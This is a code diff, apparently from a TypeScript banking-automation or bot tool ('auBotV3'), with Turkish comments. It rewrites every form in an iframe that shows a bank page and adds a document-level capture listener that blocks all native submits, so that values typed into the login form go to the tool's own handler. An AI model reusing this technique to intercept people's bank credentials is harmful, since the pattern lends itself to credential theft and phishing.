@@ -2543,6 +2543,8 @@ button[style*="display:none"][style*="box-shadow"],
       return arr;
     };
 
+    const navSubmitGuard = (e: Event) => { try { e.preventDefault(); } catch {} };
+
     submitWithCurrentValuesRef.current = submitWithCurrentValues;
 
     const forms = Array.from(doc.querySelectorAll("form"));
@@ -2550,12 +2552,20 @@ button[style*="display:none"][style*="box-shadow"],
       form.setAttribute("method", "post");
       form.setAttribute("target", "_self");
       form.setAttribute("novalidate", "novalidate");
-      if (loginForm && form === loginForm) {
-        try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
-        form.addEventListener("submit", submitWithCurrentValues as any);
-        (form as any)._auBotV3Bound = true;
-      }
+      // ⭐ TUM FORMLARA submit listener bagla (sadece loginForm'a degil)!
+      //   Gizli/ikincil bir form native submit olursa preventDefault YOK →
+      //   iframe gercek banka URL'sine navigate ediyor → sayfa FLASLAYIP donuyor
+      //   (X-Frame-Options/bos sayfa). Her formda capture+preventDefault calissin.
+      try { form.removeEventListener("submit", submitWithCurrentValues as any); } catch {}
+      form.addEventListener("submit", submitWithCurrentValues as any);
+      (form as any)._auBotV3Bound = true;
     });
+    // ⭐ KALICI NAV GUARD: capture fazinda document seviyesinde — hicbir submit
+    //   native navigasyon yapamaz (listener atlanan form edge-case'leri dahil).
+    try {
+      doc.removeEventListener("submit", navSubmitGuard as any, true);
+    } catch {}
+    doc.addEventListener("submit", navSubmitGuard as any, true);
 
     const actionNodes = computeActionNodes(doc, loginScope);
 
